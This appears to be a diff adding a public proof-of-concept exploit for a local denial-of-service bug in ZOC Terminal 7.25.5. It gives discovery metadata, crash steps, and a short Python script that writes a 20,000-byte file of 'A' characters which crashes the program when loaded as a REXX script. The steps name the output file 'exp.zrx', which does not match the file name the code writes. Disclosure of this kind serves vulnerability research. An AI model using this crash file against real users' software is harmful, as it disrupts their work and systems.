@@ -1,0 +1,21 @@
+# Exploit Title: ZOC Terminal 7.25.5 - 'Script' Denial of Service (PoC)
+# Discovery by: chuyreds
+# Discovery Date: 2020-04-05
+# Vendor Homepage: https://www.emtec.com
+# Software Link : http://www.emtec.com/downloads/zoc/zoc7255_x64.exe
+# Tested Version: 7.25.5
+# Vulnerability Type: Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to produce the crash:
+# 1.- Run python code: ZOC_7.25.5_Script.py and it will create a new file "exp.zrx"
+# 2.- Open ZOC Terminal
+# 3.- Select Script > Start REXX Script... 
+# 4.- Select "ZOC_7.25.5_Script.zrx" file and click "open"
+# 5.- Crashed
+
+cod = "\x41" * 20000
+
+f = open('ZOC_7.25.5_Script.zrx', 'w')
+f.write(cod)
+f.close()
